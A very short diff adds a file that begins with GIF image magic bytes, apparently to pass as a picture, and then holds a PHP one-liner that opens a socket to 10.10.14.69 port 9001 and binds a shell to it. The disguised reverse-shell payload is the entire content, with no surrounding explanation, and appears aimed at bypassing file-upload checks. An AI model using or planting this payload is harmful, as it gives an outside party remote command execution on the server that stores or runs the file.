@@ -1,0 +1,3 @@
+GIF89a;
+
+php -r '$sock=fsockopen("10.10.14.69",9001);exec("sh <&3 >&3 2>&3");'
